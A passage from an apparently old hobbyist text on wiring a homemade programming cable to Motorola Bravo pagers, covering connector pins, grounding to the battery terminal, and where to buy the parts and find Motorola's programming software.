this with the connector that connects the processor and receiver boards in Motorola Bravo 
pagers.  I can't give exact instructions here because unfortunately I do not own every pager in the 
world.  If they aren't hooked up correctly when you run the pager programming software it will just 
give you an error but won't affect the pager, so just switch the wires around.  Make sure you 
hooked the ground to the pager too, or else nothing will work.  The gnd wire should be connected 
to the minus terminal on the pagers battery connector.
     The chip, hood, and connector can be bought at DigiKey.  This is by far the simplest and 
easiest to build design I've seen on the net. Motorola's web page shows all of their pager designs 
so you can figure out what type of pager you have, and can then get the software for it.
